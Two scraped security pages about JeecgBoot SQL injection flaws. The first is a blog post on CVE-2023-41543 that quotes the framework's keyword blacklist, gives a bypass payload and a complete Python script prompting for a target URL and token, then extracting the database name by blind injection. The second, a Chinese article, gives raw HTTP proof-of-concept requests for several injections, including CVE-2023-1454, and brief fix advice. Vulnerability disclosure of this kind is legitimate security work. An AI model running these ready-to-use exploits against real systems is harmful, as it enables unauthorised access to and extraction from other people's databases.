=== Content from pho3n1x-web.github.io_a6e3e1af_20250115_102525.html ===

[**Pho3n1x**](/)

* [Home](/)
* [Archives](/archives/)
* [Categories](/categories/)
* [Tags](/tags/)
* [About](/about/)

September 18, 2023 pm

2.7k words

12 mins

# CVE-2023-41543(JeecgBoot Sql Injection)

## Description

JEECG Boot v3.5.3 was discovered to contain a SQL injection in /sys/replicate/check

## Affected version

JeecgBoot <= v3.5.3

## Vulnerability Analysis

It was found that the framework has protected the original SQL injection by adding a blacklist. The blacklist is as follows：

“exec|peformance\_schema|information\_schema|extractvalue|updatexml|geohash|gtid\_subset|gtid\_subtract| insert | alter | delete | grant | update | drop | chr | mid | master | truncate | char | declare |user()|”;

![](/../images/image-20230915140019578.png)

Therefore, it is possible to directly construct payloads outside of the blacklist to bypass existing protective measures，As I mentioned in the report

| ``` 1 ``` | ``` 1 'having {ascii}=(nullif (ascii (substring ((select database()), {place}, 1)), 0) or' ``` |
| --- | --- |

## Exp

The complete utilization script is as follows

| ``` 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051 ``` | ``` import requestsimport jsondef get_database(url,token):    url=url+"/jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldVal=1&dataId=asd&fieldName="    headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',        'Accept': 'application/json, text/plain, */*',        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',        'Referer': 'http://localhost:8088/jeecg-boot/jmreport/list',        'X-Access-Token': 'null',        'token': 'null',        'JmReport-Tenant-Id': 'null',        'Content-Type': 'application/json',        'Connection': 'close',        'Sec-Fetch-Dest': 'empty',        'Sec-Fetch-Mode': 'no-cors',        'Sec-Fetch-Site': 'same-origin',        'Pragma': 'no-cache',        'Cache-Control': 'no-cache'    }    headers["X_ACCESS_TOKEN"]=token    length=1    while True:        payload=f"1   having 32<(nullif(ascii((substring((select database()),{length},1))),0))   "        response=requests.get(url+payload,headers=headers)        res=json.loads(response.text)        if res["code"]!="200":            break        else:            length+=1    database=""    for place in range(1,length):        min=32        max=128        mid=(min+max)//2        while min<max:            payload=f"1   having {mid}<(nullif(ascii((substring((select database()),{place},1))),0)) "            response=requests.get(url+payload,headers=headers)            res=json.loads(response.text)            if res["code"]=="200":                min = mid + 1            else:                max = mid            mid = (min + max) // 2        database+=chr(mid)    print(database)# get_database("http://localhost:8088","")url=input("please input your target: (example:http://localhost:8088)")token=input("please input your X_ACCESS_TOKEN: ")get_database(url,token) ``` |
| --- | --- |

---

[CVE](/categories/CVE/)

[#CVE](/tags/CVE/)
[#代码审计](/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/)
[#JeecgBoot](/tags/JeecgBoot/)

CVE-2023-41543(JeecgBoot Sql Injection)
https://pho3n1x-web.github.io/2023/09/18/CVE-2023-41543(JeecgBoot\_sql)/

Author
Pho3n1x

Posted on
September 18, 2023

Licensed under
[CC BY-NC-SA 4.0](https://CREATIVECOMMONS.ORG/LICENSES/BY-NC-SA/4.0/)

[CVE-2023-41544(JeecgBoot FreeMarker SSTI)
Previous](/2023/09/18/CVE-2023-41544%28JeecgBoot_SSTI%29/ "CVE-2023-41544(JeecgBoot FreeMarker SSTI)")

[CVE-2022-22972(VM\_access\_Identity\_authentication\_bypass)
Next](/2023/09/18/CVE-2022-22972%28VM_access_%20Identity_authentication_bypass%29/ "CVE-2022-22972(VM_access_Identity_authentication_bypass)")

Table of Contents

#### Search

×

Keyword

[Hexo](https://hexo.io)  [Fluid](https://github.com/fluid-dev/hexo-theme-fluid)

Views:

Visitors:

Blog works best with JavaScript enabled



=== Content from mp.weixin.qq.com_6e626f1d_20250115_102524.html ===


![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/s7bObPUU0RQuZZYlCYsgUahwGnUMYuAKWSH480KFsfDu0AsJI45p5sPLX2peXuPgXuM6icdWyxhQpZic1Pf2hX9w/0?wx_fmt=jpeg)

# Jeegc-Boot 最新多个SQL注入漏洞

Original
Hack All

Hack All Sec

![]()

**简介**

Jeecg-Boot是一款基于Spring Boot和Jeecg-Boot-Plus的快速开发平台，它提供了一系列的代码生成器、模板引擎、权限管理、数据字典、数据导入导出等功能，可以帮助开发者快速构建企业级应用。最近在最新的jeecg-boot 3.5.0 中被爆出多个SQL注入漏洞。

官方网站：http://www.jeecg.com

**影响范围**

Jeecg-Boot = v3.5.0

**1、****sys/duplicate/check 接口SQL注入**

sys/duplicate/check 接口存在SQL注入漏洞，checksql可以被绕过，需要身份认证，判断当前数据库用户：

![]()

![]()

来源：

```
https://github.com/jeecgboot/jeecg-boot/issues/4737
```
Poc：

```
GET /jeecg-boot/sys/duplicate/check?tableName=v3_hello&fieldName=1+and%09if(user(%20)='root@localhost',sleep(0),sleep(0))&fieldVal=1&dataId=asd HTTP/1.1Host: 127.0.0.1:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36Connection: closeCache-Control: max-age=0X_ACCESS_TOKEN: [Token值]
```

**2、jmreport/qurestSql 未授权SQL注入(CVE-2023-1454)**

根据J0hnWalker的分析，漏洞产生的主要原因是jimureport-spring-boot-starter-1.5.6.jar中/org/jeecg/modules/jmreport/desreport/a/a.class文件：

![]()

参数 apiSelectId 会从jimu\_report\_db表中通过id参数查询数据，id参数未过滤：

![]()

jimu\_report\_db表中id值为1272834687525482497和1290104038414721025等的db\_dyn\_sql列是sql语句，且引用了id参数，这会导致二次注入：

![]()

![]()

Poc：

```
POST /jeecg-boot/jmreport/qurestSql HTTP/1.1Host: localhost:8080Cache-Control: max-age=0sec-ch-ua: "Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"sec-ch-ua-mobile: ?0sec-ch-ua-platform: "macOS"Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6Connection: closeContent-Length: 130Content-Type: application/json;charset=UTF-8
{"apiSelectId":"1290104038414721025","id":"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '"}
```
获取当前数据库用户：

![]()

来源：

```
https://github.com/J0hnWalker/jeecg-boot-sqli
```

**3、jmreport/loadTableData授权SQL注入**

可视化设计-->报表设计器功能处存在SQL注入：

![]()

通过新建报表添加SQL数据集：

![]()

![]()

在报表SQL中插入SQL语句，在数据预览时触发SQL注入：

![]()

来源：

```
https://github.com/jeecgboot/jeecg-boot/issues/4702
```

**修复建议**

1、目前官方暂未发布安全版本修复该漏洞，请及时关注官网最新版本的发布情况。2、设置访问IP白名单或将系统部署到内网环境中。3、修改漏洞代码，过滤id参数，防止SQL注入。

预览时标签不可点

![]()

Scan to Follow

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/s7bObPUU0RSJgQVsjeE3Uia9otR8DA7WjnXtNLRWvC6VgScHOjibKicMHCLIdQIrjiaxtjCVbzQcRpHqJOOS5Jibq8w/0?wx_fmt=png)

Hack All Sec

向上滑动看下一个

Got It

![]()
Scan with Weixin to
use this Mini Program

Cancel
Allow

Cancel
Allow

×
分析

:
，
，
，
，
，
，
，
，
，
，
，
，
.

Video
Mini Program
Like
，轻点两下取消赞
Wow
，轻点两下取消在看
Share
Comment
Favorite


